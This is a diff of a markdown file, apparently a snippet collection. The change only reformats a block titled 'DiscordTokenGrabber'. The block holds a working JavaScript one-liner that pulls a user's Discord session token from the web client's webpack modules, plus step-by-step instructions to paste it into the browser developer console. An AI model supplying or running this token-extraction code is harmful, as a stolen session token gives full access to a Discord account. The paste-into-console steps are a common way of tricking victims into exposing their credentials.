@@ -316,11 +316,12 @@ Or where you put the nextcloud installation
 
 
 ## DiscordTokenGrabber (by [ITZNEXUS](https://github.com/NotNexuss/Get-Discord-Token))
-    ```javascript
-    // CODE BY ITZNEXUS
-    (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-    // HOW TO
-    // If copied, go to discord (browser version) and press "CTRL+SHIFT+I" on your keyboard, if that doesn't work, click on the three dots on upright corner. Then hover on more tools and hover your cursor over "Developer Tools". then open console tab. While it's open, paste the code that we copied. 
-    ```
+
+```javascript
+// CODE BY ITZNEXUS
+(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+// HOW TO
+// If copied, go to discord (browser version) and press "CTRL+SHIFT+I" on your keyboard, if that doesn't work, click on the three dots on upright corner. Then hover on more tools and hover your cursor over "Developer Tools". then open console tab. While it's open, paste the code that we copied. 
+```
 
 
